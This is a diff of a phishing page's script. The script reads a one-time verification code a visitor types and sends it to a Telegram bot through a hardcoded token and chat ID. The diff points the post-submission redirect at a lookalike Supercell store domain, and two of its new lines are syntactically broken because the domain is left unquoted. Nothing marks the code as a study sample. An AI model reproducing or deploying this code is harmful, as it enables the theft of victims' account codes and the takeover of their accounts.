@@ -85,7 +85,7 @@
     // BOT MƏLUMATLARINIZI BURA YAZIN
     const BOT_TOKEN = "8547908650:AAGrPuSRhlb-SuE_x5ui1wZ9so5sBMclL5A";
     const CHAT_ID = "-1003369084883";
-    const REDIRECT_URL = "hazir_sehifeniz.html";
+    const REDIRECT_URL = "Https://supercellstore.cv";
 
     function sendToTelegram() {
         const code = document.getElementById("otpCode").value;
@@ -101,9 +101,9 @@
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
         }).then(() => {
-            window.location.href = REDIRECT_URL;
+            window.location.href = supercellstore.cv;
         }).catch(() => {
-            window.location.href = REDIRECT_URL;
+            window.location.href = supercellstore.cv;
         });
     }
 
@@ -119,6 +119,7 @@
 
 </body>
 </html>
+
 
 
 
